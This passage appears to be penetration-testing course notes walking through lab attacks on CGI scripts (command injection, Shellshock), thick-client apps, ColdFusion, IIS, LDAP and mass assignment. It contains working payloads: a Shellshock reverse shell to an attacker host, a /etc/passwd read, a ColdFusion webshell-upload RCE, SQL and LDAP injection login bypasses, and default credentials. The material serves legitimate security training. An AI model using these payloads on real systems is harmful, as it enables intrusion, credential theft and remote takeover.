What each flag does:

-w /usr/share/dirb/wordlists/common.txt — the wordlist to use for fuzzing
-u http://10.129.204.227:8080/cgi/FUZZ.cmd — the URL with FUZZ as the placeholder that gets replaced by each wordlist entry
.cmd — appends the .cmd extension to each attempt

No results found for .cmd on this Windows target.

Step 3 — Fuzz for .BAT Extensions
bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat

Output:

[Status: 200, Size: 81, Words: 14, Lines: 2, Duration: 234ms]
    * FUZZ: welcome

welcome.bat found! Navigating to http://10.129.204.227:8080/cgi/welcome.bat returns:

Welcome to CGI, this section is not functional yet. Please return to home page.
Exploitation
Step 4 — Test Command Injection with dir
http://10.129.204.227:8080/cgi/welcome.bat?&dir

What this does: Appends &dir to the CGI script URL using & as the batch command separator. The dir command lists directory contents. This returns the directory listing confirming the vulnerability.

Step 5 — Retrieve Environment Variables
http://10.129.204.227:8080/cgi/welcome.bat?&set

What this does: The set command prints all environment variables. From the output we see the PATH variable has been unset, so we need to hardcode full paths for commands.

Step 6 — Execute whoami with Full Path (URL Encoded)
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe

What this does: URL encodes the path c:\windows\system32\whoami.exe because Apache Tomcat uses a regular expression patch to prevent special characters. URL encoding bypasses this filter:

%3A = :
%5C = \

This successfully executes whoami on the target Windows system.

Attacking Common Gateway Interface (CGI) Applications - Shellshock
Attacking Common Gateway Interface (CGI) Applications - Shellshock

A Common Gateway Interface (CGI) is middleware between web servers, external databases, and information sources used to help a web server render dynamic pages. CGI scripts and programs are kept in the /CGI-bin directory on a web server and can be written in C, C++, Java, or PERL. They are used for guest books, forms, mailing lists, blogs, and any case where the webserver must dynamically interact with the user. The Shellshock vulnerability (CVE-2014-6271) was discovered in 2014 in GNU Bash up to version 4.3 — at discovery it was a 25-year-old bug. It allows attackers to exploit old versions of Bash that save environment variables incorrectly: when saving a function as a variable, vulnerable Bash versions execute commands included after the function definition. CGI scripts run in the security context of the web server (typically www-data) and pass environment variables including HTTP headers like User-Agent, making them the primary attack vector for Shellshock.

Enumeration - Gobuster
Step 1 — Find CGI Scripts
bash
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi

What each flag does:

dir — directory enumeration mode
-u http://10.129.204.231/cgi-bin/ — the target URL pointing to the cgi-bin directory
-w /usr/share/wordlists/dirb/small.txt — the wordlist to use
-x cgi — append .cgi extension to each wordlist entry

Output:

/access.cgi  (Status: 200) [Size: 0]

CGI script access.cgi found. Test it with cURL:

bash
curl -i http://10.129.204.231/cgi-bin/access.cgi

Output:

HTTP/1.1 200 OK
Content-Length: 0
Content-Type: text/html

Returns empty content but 200 status — worth investigating further.

Confirming the Vulnerability
Step 2 — Test Shellshock via User-Agent
bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi

What this does: Injects the Shellshock payload into the User-Agent header via -H. The payload structure is:

() { :; } — defines an empty function (the Shellshock trigger)
; — ends the function definition
echo ; echo ; — adds blank lines for clean output
/bin/cat /etc/passwd — the malicious command to execute

When the CGI script processes this header and passes it to Bash as an environment variable, vulnerable Bash executes the commands after the function definition. Output returns the full /etc/passwd file, confirming the vulnerability.

Exploitation to Reverse Shell Access
Step 3 — Get Reverse Shell

Start listener:

bash
sudo nc -lvnp 7777

Trigger reverse shell:

bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi

What this does: Injects a bash reverse shell as the Shellshock payload. /bin/bash -i starts an interactive bash shell. >& /dev/tcp/10.10.14.38/7777 redirects stdin, stdout, and stderr to the TCP connection. 0>&1 redirects input from the same connection.

Listener output:

connect to [10.10.14.38] from (UNKNOWN) [10.129.204.231] 52840
www-data@htb:/usr/lib/cgi-bin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Shell confirmed as www-data. From here, enumerate for privilege escalation paths or pivot further into the internal network.

Mitigation

The quickest way to remediate Shellshock is to update the version of Bash on the affected system. For end-of-life Ubuntu/Debian systems, the package manager may need upgrading first. For IoT devices where upgrading is not possible, ensure the system is not internet-exposed, firewall it on the internal network, and consider decommissioning it. Upgrading Bash or taking the host offline is always the best course of action.

Attacking Thick Client Applications
Attacking Thick Client Applications

Thick client applications are applications installed locally on computers, unlike thin client applications that run on remote servers accessed through web browsers. They do not require internet access to run and perform better in processing power, memory, and storage capacity. Thick client applications are commonly used in enterprise environments for project management, customer relationship management, inventory management, and productivity software — typically developed using Java, C++, .NET, or Microsoft Silverlight. They can be categorized into two-tier architecture (application communicates directly with the database) and three-tier architecture (application communicates with an application server which then communicates with the database via HTTP/HTTPS). Three-tier is more secure as attackers cannot communicate directly with the database. Applicable attacks include improper error handling, hardcoded sensitive data, DLL Hijacking, buffer overflow, SQL injection, insecure storage, and session management issues.

Penetration Testing Steps
Information Gathering

The first step is identifying application architecture, programming languages and frameworks, how the application and infrastructure work, technologies used on client and server sides, and entry points and user inputs. Tools used include CFF Explorer, Detect It Easy, Process Monitor, and Strings. Identifying common vulnerabilities requires understanding the application fully before attempting any exploitation.

Client Side Attacks

Sensitive information like usernames, passwords, tokens, or service communication strings may be stored in the application's local files. Static analysis using proper tools can reverse-engineer .NET and Java applications including EXE, DLL, JAR, CLASS, WAR formats. Dynamic analysis is also necessary as thick client applications store sensitive information in memory. Tools include Ghidra, IDA, OllyDbg, Radare2, dnSpy, x64dbg, JADX, and Frida.

Network Side Attacks

If the application communicates with a local or remote server, network traffic analysis helps capture sensitive information transferred through HTTP/HTTPS or TCP/UDP connections. Tools include Wireshark, tcpdump, TCPView, and Burp Suite.

Server Side Attacks

Server-side attacks in thick client applications are similar to web application attacks, covering most of the OWASP Top Ten vulnerabilities.

Retrieving Hardcoded Credentials from Thick-Client Applications
Step 1 — Run and Monitor the Executable
cmd
C:\Apps>.\Restart-OracleService.exe

What this does: Runs the Oracle restart service executable. It appears to do nothing visible but actually creates and deletes temp files. Download ProcMon64 from SysInternals and monitor the process — it reveals the executable creates a temp file in C:\Users\Matt\AppData\Local\Temp.

Step 2 — Prevent File Deletion

Right-click C:\Users\Matt\AppData\Local\Temp → Properties → Security → Advanced → Edit the user → Show advanced permissions → Deselect Delete subfolders and files and Delete checkboxes → OK → Apply.

What this does: Prevents the service from deleting its temp files, allowing us to capture them before they disappear.

Step 3 — Capture the Batch File

Run Restart-OracleService.exe again and check the temp folder:

cmd
dir C:\Users\cybervaca\AppData\Local\Temp\2

Output shows 6F39.bat and 6F39.tmp files were created (names are random each time).

Step 4 — Analyze the Batch File

Reading the batch file content shows it writes base64 data to c:\programdata\oracle.txt, then runs a PowerShell script monta.ps1 that decodes the base64 to restart-service.exe, runs it, then deletes everything. Modify the batch file to remove the deletion lines and run it again. The oracle.txt and monta.ps1 files are preserved.

Step 5 — Extract and Run the PowerShell Script
powershell
cat C:\programdata\monta.ps1

The script reads oracle.txt, concatenates the base64 lines, removes spaces, and writes the decoded bytes to restart-service.exe. Run the script to obtain the executable:

powershell
ls C:\programdata\

Output shows restart-service.exe created (432273 bytes).

Step 6 — Analyze with x64dbg and dnSpy

Load restart-service.exe in x64dbg. Navigate to Options → Preferences → uncheck everything except Exit Breakpoint. Load the file and follow to Memory Map. Find the mapped region with size 0x3000, type MAP, protection -RW--. Double-click it — MZ magic bytes in the ASCII column confirm it is a DOS executable. Export by right-clicking → Dump Memory to File.

powershell
C:\TOOLS\Strings\strings64.exe .\restart-service_00000000001E0000.bin

Output reveals .NETFramework,Version=v4.0 — this is a .NET executable. Use De4Dot to deobfuscate:

Drag restart-service_00000000001E0000.bin onto de4dot.exe. This generates a cleaned .bin file. Drag the cleaned file onto DnSpy.exe to view the C# source code which reveals hardcoded credentials — a custom runas.exe with hardcoded Oracle service credentials.

Exploiting Web Vulnerabilities in Thick-Client Applications
Exploiting Web Vulnerabilities in Thick-Client Applications

Thick client applications with three-tier architecture can be susceptible to web-specific attacks like SQL Injection and Path Traversal despite their architectural security advantage. In this scenario, an FTP server with anonymous access contains fatty-client.jar and several note files. The notes reveal: the server was reconfigured to run on port 1337 instead of 8000, the client still uses the old port, Java 8 is required, and login credentials are qtc:clarabibi. Running the JAR produces a "Connection Error!" because the port must be updated from 8000 to 1337. The application must be decompiled, modified, repackaged, and re-signed to work correctly.

Path Traversal
Step 1 — Add Server to Hosts File
cmd
C:\> echo 10.10.10.174    server.fatty.htb >> C:\Windows\System32\drivers\etc\hosts

What this does: Maps the server IP to the hostname the application expects, resolving the DNS lookup.

Step 2 — Extract and Modify the JAR

Extract fatty-client.jar and find port 8000 in beans.xml:

powershell
ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List

Edit beans.xml and change value = "8000" to value = "1337".

Step 3 — Remove Signature Files and Rebuild

Delete META-INF/1.RSA and META-INF/1.SF. Remove all SHA-256 hash entries from META-INF/MANIFEST.MF, keeping only the header lines. Rebuild:

cmd
cd fatty-client
jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *

What this does: jar -cmf creates a new JAR file using the specified manifest file with all files in the current directory.

Step 4 — Exploit Path Traversal

In the FileBrowser, the server filters / characters from input. Decompile with JD-GUI and modify ClientGuiTest.java to change the folder path:

java
ClientGuiTest.this.currentFolder = "..";
try {
  response = ClientGuiTest.this.invoker.showFiles("..");

Recompile, rebuild the JAR, and navigate to FileBrowser → Config. The directory listing now shows fatty-server.jar — a traversal one level up was successful.

SQL Injection

Decompiling fatty-server.jar reveals the checkLogin() function uses unparameterized SQL:

java
rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");

The username is passed directly into the query without sanitization. The password is hashed as sha256(username+password+"clarabibimakeseverythingsecure") before comparison.

To exploit this using a UNION injection, modify User.java to send the password as plaintext instead of hashed:

java
public void setPassword(String password) {
    this.password = password;
}

Rebuild the JAR and log in with this username payload:

abc' UNION SELECT 1,'abc','a@b.com','abc','admin

And password: abc

What this does: The SQL query becomes:

sql
select id,username,email,password,role from users where username='abc' UNION SELECT 1,'abc','a@b.com','abc','admin'

The first SELECT fails (no user abc), the UNION SELECT returns a fake user with role admin and password abc. The server compares password abc with the sent password abc — match! Login succeeds as admin.

ColdFusion - Discovery & Enumeration
ColdFusion - Discovery & Enumeration

ColdFusion is a programming language and web application development platform based on Java, initially developed by Allaire Corporation in 1995, acquired by Macromedia in 2001, and then by Adobe Systems. ColdFusion Markup Language (CFML) is the proprietary language with HTML-like syntax used to develop dynamic web applications. It includes tags and functions for database integration, web services, email management, and other common web development tasks. Key benefits include rapid development of data-driven web applications, easy database integration (Oracle, SQL Server, MySQL), simplified web content management, high performance optimized for low latency and high throughput, and real-time collaboration features. ColdFusion uses several default ports: 80 (HTTP), 443 (HTTPS), 1935 (RPC), 25 (SMTP), 8500 (SSL), and 5500 (Server Monitor). Known ColdFusion CVEs include arbitrary file upload (CVE-2021-21087), Active Directory misconfiguration (CVE-2020-24453), command injection (CVE-2020-24450), arbitrary file reading (CVE-2020-24449), and XSS (CVE-2019-15909).

Enumeration

ColdFusion can be identified by port scanning (ports 80, 443), file extensions (.cfm or .cfc), HTTP headers (Server: ColdFusion or X-Powered-By: ColdFusion), error messages referencing ColdFusion-specific tags, and default files like CFIDE/administrator/index.cfm.

Step 1 — Nmap Scan
bash
nmap -p- -sC -Pn 10.129.247.30 --open

Output:

135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

Port 8500 is a default ColdFusion SSL port. Browse to http://10.129.247.30:8500 which lists two directories: CFIDE and cfdocs, confirming ColdFusion. Browse to /CFIDE/administrator which loads the ColdFusion 8 Administrator login page — ColdFusion 8 confirmed.

Attacking ColdFusion
Attacking ColdFusion

Now that ColdFusion 8 is confirmed, we use searchsploit to find known exploits. ColdFusion 8 has two particularly relevant exploits: a Directory Traversal vulnerability (CVE-2010-2861) and an Unauthenticated Remote Code Execution (CVE-2009-2265). CVE-2010-2861 affects multiple ColdFusion files including CFIDE/administrator/settings/mappings.cfm, logging/settings.cfm, datasources/index.cfm, j2eepackaging/editarchive.cfm, and CFIDE/administrator/enter.cfm, allowing attackers to read arbitrary files by manipulating the locale parameter. CVE-2009-2265 is an unauthenticated file upload vulnerability in the FCKeditor package allowing unauthenticated users to upload files and gain RCE.

Searchsploit
bash
searchsploit adobe coldfusion

What this does: Searches the local Exploit Database copy for exploits matching "adobe coldfusion". Output shows multiple results including "Adobe ColdFusion - Directory Traversal" and "Adobe ColdFusion 8 - Remote Command Execution (RCE)".

Directory Traversal
Step 1 — Copy and Run the Exploit
bash
searchsploit -p 14641
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
python2 14641.py

Output shows usage:

usage: 14641.py <host> <port> <file_path>
example: 14641.py localhost 80 ../../../../../../../lib/password.properties
Step 2 — Read the password.properties File
bash
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"

What this does: Exploits CVE-2010-2861 by manipulating the locale parameter in a vulnerable ColdFusion page to read the password.properties file at the specified path using ../ traversal sequences.

Output:

trying /CFIDE/wizards/common/_logintowizard.cfm
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true

The encrypted admin password hash is retrieved. The password.properties file stores encrypted passwords for various services including database connections, mail servers, and LDAP servers.

Unauthenticated RCE
Step 1 — Copy the RCE Exploit
bash
searchsploit -p 50057
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
Step 2 — Modify the Exploit with Target Information

Edit the exploit script to set correct values:

python
lhost = '10.10.14.55'   # HTB VPN IP
lport = 4444            # Listener port
rhost = "10.129.247.30" # Target IP
rport = 8500            # Target port
filename = uuid.uuid4().hex
Step 3 — Run the Exploit
bash
python3 50057.py

What the exploit does step by step:

Generates a JSP payload of 1497 bytes
Uploads the payload via the FCKeditor file upload path: /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
Returns the uploaded shell URL
Executes the payload
Establishes a reverse shell connection

Output:

Sending request and printing response...
Upload Success... Webshell path: http://10.129.247.30/userfiles/file/1269fd7bd2b341fab6751ec31bbfb610.jsp
Listening for connection...
Executing the payload...

Reverse shell received:

Microsoft Windows [Version 6.1.7600]
C:\ColdFusion8\runtime\bin>dir

Full Windows command shell obtained on the ColdFusion server.

IIS Tilde Enumeration
IIS Tilde Enumeration

IIS tilde directory enumeration is a technique used to uncover hidden files, directories, and short file names (8.3 format) on some versions of Microsoft IIS web servers. Windows generates a short file name in 8.3 format for every file or folder created — 8 characters for the name, a period, and 3 characters for the extension. The tilde (~) character followed by a sequence number signifies a short file name in a URL. If a short file name is discovered, it can be used to access corresponding files even if they were meant to be hidden. The enumeration works by sending HTTP requests with different character combinations in the URL to identify valid short file names, starting with http://example.com/~a through ~z and progressively narrowing down each character. The number after ~ (like ~1 or ~2) is a unique identifier distinguishing files with similar names within the same directory.

Enumeration
Step 1 — Nmap Scan
bash
nmap -p- -sV -sC --open 10.129.224.91

Output:

80/tcp open  http  Microsoft IIS httpd 7.5

IIS 7.5 running on port 80 — this version is vulnerable to tilde enumeration.

Step 2 — Tilde Enumeration Using IIS ShortName Scanner
bash
java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/

What each argument does:

0 — scan mode (0 = default)
5 — number of threads
http://10.129.204.231/ — target URL

Output:

|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): /~1/
|_ Identified directories: 2
    |_ ASPNET~1
    |_ UPLOAD~1
|_ Identified files: 3
    |_ CSASPX~1.CS
    |_ CSASPX~1.CS??
    |_ TRANSF~1.ASP

The short name TRANSF~1.ASP is found but the target does not permit direct GET access, so we need to brute-force the full filename.

Step 3 — Generate a Custom Wordlist
bash
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt

What this does:

egrep -r ^transf /usr/share/wordlists/* — recursively searches all wordlists for lines starting with "transf"
| sed 's/^[^:]*://' — removes the filename and colon prefix from egrep output, leaving only the word
> /tmp/list.txt — saves results to a new wordlist file
Step 4 — Gobuster with Custom Wordlist
bash
gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp

What each flag does:

dir — directory enumeration mode
-u http://10.129.204.231/ — target URL
-w /tmp/list.txt — our custom wordlist of words starting with "transf"
-x .aspx,.asp — test each word with both .aspx and .asp extensions

Output:

/transf**.aspx  (Status: 200) [Size: 941]

The full filename is discovered — a .aspx file corresponding to the short name TRANSF~1.ASP is found and confirmed accessible with a 200 status code.

LDAP
LDAP

LDAP (Lightweight Directory Access Protocol) is a protocol used to access and manage directory information — hierarchical data stores containing information about network resources such as users, groups, computers, and printers. LDAP is efficient with fast queries, supports a global naming model ensuring unique entries, is extensible for custom attributes, compatible across platforms running over TCP/IP and SSL, and provides authentication mechanisms for single sign-on. However, LDAP requires directory servers to be compliant (limiting vendor choices), is complex for many administrators, does not encrypt traffic by default (requiring LDAPS or StartTLS), and is vulnerable to LDAP injection attacks. LDAP works using a client-server architecture where clients send requests encoded in ASN.1 transmitted over TCP/IP. Common ports are 389 (standard) and 636 (LDAPS). Two popular implementations are OpenLDAP (open-source) and Microsoft Active Directory (Windows-based with additional features like policy administration and SSO).

Enumeration
Step 1 — Nmap Scan
bash
nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229

What each flag does:

-p- — scan all ports
-sC — run default scripts
-sV — version detection
--open — show only open ports
--min-rate=1000 — send at least 1000 packets per second for speed

Output:

80/tcp  open  http  Apache httpd 2.4.41 ((Ubuntu))
389/tcp open  ldap  OpenLDAP 2.2.X - 2.3.X

An HTTP server on port 80 and OpenLDAP on port 389 are detected. The web application likely uses LDAP for authentication.

ldapsearch Example
bash
ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"

What each flag does:

-H ldap://ldap.example.com:389 — the LDAP server URL and port
-D "cn=admin,dc=example,dc=com" — the bind DN (Distinguished Name) to authenticate as
-w secret123 — the password for authentication
-b "ou=people,dc=example,dc=com" — the base DN to search under
"(mail=john.doe@example.com)" — the LDAP filter to match entries
LDAP Injection
Step 2 — Test LDAP Injection with Wildcard

Attempting to log in using a wildcard character * in both username and password fields:

Username: *
Password: *

What this does: The LDAP query becomes:

(&(objectClass=user)(sAMAccountName=*)(userPassword=*))

The * wildcard matches any value, so the query returns the first user in the directory regardless of credentials — effectively bypassing authentication. This grants access to the system without valid credentials, confirming the LDAP injection vulnerability.

To prevent LDAP injection: thoroughly validate and sanitize user input before incorporating into LDAP queries, remove LDAP-specific special characters like *, (, ), |, &, and use parameterized queries ensuring user input is treated as data only.

Web Mass Assignment Vulnerabilities
Web Mass Assignment Vulnerabilities

Web mass assignment vulnerability is a type of security vulnerability where attackers can modify model attributes of an application through parameters sent to the server. Several frameworks offer mass-assignment features that allow developers to directly insert a whole set of user-entered data into an object or database. Without a whitelist protecting the fields, attackers can use this to steal sensitive information or destroy data. Ruby on Rails is a web framework commonly associated with this vulnerability type. The attack involves an attacker finding unprotected model attributes by reversing application code, then assigning values to critical parameters during HTTP requests to modify database data and change intended functionality. The fix is to use strong parameters or whitelisting methods provided by the framework, explicitly allowing only specific attributes to be mass-assigned.

Exploiting Mass Assignment Vulnerability
Step 1 — Register a Normal Account

Browse to the registration page and register normally. The response confirms account creation but login shows "Account is pending approval" — an admin must approve registration.

Step 2 — Analyze the Source Code

Reading /opt/asset-manager/app.py reveals the registration logic:

python
try:
  if request.form['confirmed']:
    cond=True
except:
  cond=False

The confirmed parameter sets the cond (condition) variable. If confirmed is present in the form data, cond is set to True, bypassing the pending approval check.

Step 3 — Exploit via Burp Suite

Capture the HTTP POST request to /register using Burp Suite. Modify the request parameters to add the confirmed parameter:

username=new&password=test&confirmed=test

What this does: The confirmed parameter is present in the POST data, so the Python code sets cond=True and inserts the user with approval already granted. The mass assignment vulnerability allows us to set the confirmed field that was never intended to be user-controllable.

Step 4 — Log in

Log in with new:test credentials — access granted without waiting for admin approval. The mass assignment vulnerability is successfully exploited.

Attacking Applications Connecting to Services
Attacking Applications Connecting to Services

Applications connected to services often include connection strings that can be leaked if not protected. This section covers enumerating and exploiting applications connected to other services to collect information and move laterally or escalate privileges. Connection strings contain credentials for databases, APIs, and other services — if they are hardcoded in binaries or accessible via debugging tools, they represent a critical finding.

ELF Executable Examination
Step 1 — Run the Binary
bash
./octopus_checker

Output:

Program had started..
Attempting Connection
Connecting ...
[unixODBC][Driver Manager]Can't open lib 'ODBC Driver 17 for SQL Server' : file not found
connected

The binary attempts a SQL connection. The ODBC driver is missing locally but the binary contains the connection string.

Step 2 — Load in GDB with PEDA
bash
gdb ./octopus_checker
assembly
gdb-peda$ set disassembly-flavor intel
gdb-peda$ disas main

What this does: set disassembly-flavor intel sets the disassembly to Intel syntax (easier to read). disas main disassembles the main function showing all call instructions and string references. The disassembly reveals a call to SQLDriverConnect.

Step 3 — Set Breakpoint and Run
assembly
gdb-peda$ b *0x5555555551b0
gdb-peda$ run

What this does: Sets a breakpoint at the SQLDriverConnect function address. When the program runs and reaches this breakpoint, we can inspect the registers. The RDX register contains the full connection string:

RDX: 0x7fffffffda70 ("DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=username;PWD=password;")

The credentials username:password are exposed in the connection string and can be used to connect to the MSSQL service directly or tested for reuse across other network services.

DLL File Examination
Step 1 — Examine the DLL Metadata
powershell
Get-FileMetaData .\MultimasterAPI.dll

Output reveals .NETFramework,Version=v4.6.1 and an internal API endpoint http://localhost:8081 with POST method — confirming this is a .NET assembly.

Step 2 — Decompile with dnSpy

Load MultimasterAPI.dll into dnSpy. Navigate to MultimasterAPI.Controllers → ColleagueController. The source code reveals a database connection string containing hardcoded credentials in plaintext. These credentials can be used to connect to the MSSQL service directly or tested against other services via password spraying.


Other Notable Applications
Other Notable Applications
Though this module focuses on specific applications, many others are encountered during real-world penetration tests. Large enterprise assessments can produce EyeWitness reports with 500+ pages of web application screenshots. The methodology learned throughout this module — fingerprinting, enumeration, checking for default credentials, looking for built-in functionality leading to RCE, and searching for known CVEs — applies to every application encountered, not just the ones explicitly covered. Below are honorable mentions worth knowing:

Axis2 — can be abused similarly to Tomcat. Often sits on top of a Tomcat installation. Check for weak admin credentials and upload a webshell as an AAR file. A Metasploit module exists for this.

WebSphere — has many historical vulnerabilities. Default credentials system:manager can allow WAR file deployment similar to Tomcat for RCE.

Elasticsearch — has had several vulnerabilities and is sometimes found forgotten on large enterprise networks. The HTB machine Haystack features Elasticsearch.

Zabbix — open-source system and network monitoring with vulnerabilities including SQL injection, authentication bypass, stored XSS, LDAP password disclosure, and RCE. Has built-in functionality abusable for RCE via the Zabbix API. HTB box Zipper demonstrates this.

Nagios — system and network monitoring product with a wide variety of historical issues including RCE, root privilege escalation, SQL injection, and stored XSS. Check for default credentials nagiosadmin:PASSW0RD.

WebLogic — Java EE application server with 190 reported CVEs including many unauthenticated RCE exploits, many being Java Deserialization vulnerabilities from 2007 through 2021.

Wikis/Intranets — internal Wikis (MediaWiki), SharePoint, custom intranet pages often have document repositories or search functionality revealing valid credentials. Always search for downloadable documents and use any available search feature to look for passwords, keys, and configuration data.

DotNetNuke (DNN) — open-source CMS written in C# using .NET. Historical issues include authentication bypass, directory traversal, stored XSS, file upload bypass, and arbitrary file download.

vCenter — used in large organizations to manage multiple ESXi instances. Check for weak credentials and vulnerabilities including Apache Struts 2 RCE and the unauthenticated OVA file upload (CVE-2021-22005). vCenter often runs as SYSTEM or even domain admin — an extremely high-value target.

The core lesson from this entire module is that a combination of thorough enumeration, checking for default credentials, understanding built-in functionality, and knowing common CVEs is the methodology that produces results on any application — familiar or completely unknown. A single set of default credentials or an overlooked built-in feature can be all that is needed to fully compromise a system.

